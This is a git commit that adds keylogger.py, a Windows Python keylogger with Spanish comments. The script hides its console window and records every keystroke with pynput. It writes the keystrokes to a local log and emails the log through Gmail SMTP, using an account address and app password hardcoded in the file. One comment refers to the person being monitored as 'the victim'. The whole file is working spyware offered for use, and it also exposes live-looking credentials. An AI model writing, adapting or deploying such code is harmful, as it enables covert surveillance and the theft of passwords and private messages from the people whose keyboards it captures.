d8cb1881604b7365467f53d35b133bbd200ff7bd
Fabian <96096173+PetusoTwo@users.noreply.github.com>
2024-07-20 14:54:36 -0500

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,82 @@
+import win32console
+import win32gui 
+import pynput.keyboard
+import smtplib
+import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+#Para que este en segundo plano o no se vea#
+ventana = win32console.GetConsoleWindow()
+win32gui.ShowWindow(ventana, 0)
+
+#Abrir el archivo y sino existe lo crea#
+log_file = open("log.txt", "w+")
+
+def enviar_datos():
+    msg = MIMEMultipart()
+    password = "mjzrhynqxippsthx"#"keyloger2097kaitext"
+    msg['From'] = "key47502@gmail.com"
+    msg['To'] = "key47502@gmail.com"
+    msg['Subject'] = "Keylogger Data"
+    msg.attach(MIMEText(open('log.txt').read()))
+    #Capturar errores#
+    try:
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.starttls()
+        server.login(msg['From'], password)
+        server.sendmail(msg['From'], msg['To'], msg.as_string())
+        server.quit()
+    except:
+        print("Error al enviar el correo")
+#Funciones
+def presiona(key):
+    key1 = convert(key)
+    if key1 == "Key.esc":
+        print("Saliendo...")
+        imprimir()
+        return False
+    elif key1 == "Key.space":
+        lista_teclas.append(" ")
+    elif key1 == "Key.enter":
+        lista_teclas.append("\n")
+    elif key1 == "Key.backspace":
+        lista_teclas.pop()
+    elif key1 == "Key.shift":
+        pass
+        #lista_teclas.append(" ")
+    elif key1 == "Key.ctrl":
+        pass
+        #lista_teclas.append(" ")
+    elif key1 == "Key.alt":
+        pass
+        #lista_teclas.append(" ")
+    else:
+        lista_teclas.append(key1)
+
+#ESTO ES PARA DARNOS CUENTA CUANDO SUELTA LA TECLA PRESIONADA PERO NO ES NECESARIO PARA EL SCRIPT
+# def libera(key):
+#     key1 = convert(key)
+#     print("Tecla liberada: {0}".format(key1))
+#     if key == pynput.keyboard.Key.esc:
+#         print("Saliendo...")
+#         return False
+
+def imprimir():
+    teclas = ''.join(lista_teclas)
+    log_file.write(teclas)
+    log_file.write("\n")
+    log_file.close()
+    time.sleep(5)
+    enviar_datos()
+#Aca es donde van las teclas presionadas por la victima#
+lista_teclas = []
+
+def convert(key):
+    if isinstance(key, pynput.keyboard.KeyCode):
+        return key.char
+    else:
+        return str(key)
+
+with pynput.keyboard.Listener(on_press=presiona) as listener:
+    listener.join()
